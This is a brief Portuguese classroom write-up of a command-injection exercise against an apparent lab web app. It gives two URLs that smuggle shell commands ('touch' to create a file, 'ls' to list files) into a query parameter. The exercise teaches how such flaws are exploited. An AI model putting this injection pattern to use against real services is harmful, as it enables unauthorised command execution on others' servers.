# Command Injection

Essa prática foi feita na sala de aula, consistia na injeção de comando para a criação de um arquivo com meu nome.

*criando o arquivo no servidor:
```
http://commandinjection.herokuapp.com/?dir=folder;touch esdrasemanuel.txt
```
*listando:
```
http://commandinjection.herokuapp.com/?dir=folder;ls
```
